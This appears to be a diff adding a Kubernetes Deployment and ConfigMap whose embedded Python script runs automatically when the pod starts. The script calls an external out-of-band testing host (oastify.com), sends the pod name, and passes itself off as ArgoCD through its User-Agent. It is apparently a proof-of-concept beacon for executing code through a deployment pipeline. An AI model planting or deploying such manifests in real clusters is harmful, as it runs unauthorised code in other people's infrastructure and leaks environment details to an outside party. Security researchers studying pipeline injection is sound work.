@@ -1,0 +1,67 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: callback-app
+  namespace: default
+  labels:
+    app: callback-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: callback-app
+  template:
+    metadata:
+      labels:
+        app: callback-app
+    spec:
+      containers:
+      - name: python-callback
+        image: python:3.9-slim
+        command: ["python", "/app/callback.py"]
+        volumeMounts:
+        - name: scripts
+          mountPath: /app
+        env:
+        - name: HOSTNAME
+          valueFrom:
+            fieldRef:
+              fieldPath: metadata.name
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "50m"
+          limits:
+            memory: "128Mi"
+            cpu: "100m"
+      volumes:
+      - name: scripts
+        configMap:
+          name: callback-scripts
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: callback-scripts
+  namespace: default
+data:
+  callback.py: |
+    #!/usr/bin/env python3
+    import requests
+    import os
+    
+    def make_callback():
+        url = "http://czfi4p3gakftz2zlkhbaxtr25tbkzanz.oastify.com"
+        try:
+            headers = {
+                'User-Agent': 'ArgoCD-Python-App/1.0',
+                'X-Pod-Name': os.getenv('HOSTNAME', 'unknown')
+            }
+            response = requests.get(url, headers=headers, timeout=10)
+            print(f"Callback successful: Status {response.status_code}")
+        except Exception as e:
+            print(f"Callback failed: {e}")
+    
+    if __name__ == "__main__":
+        print("Starting callback script...")
+        make_callback()
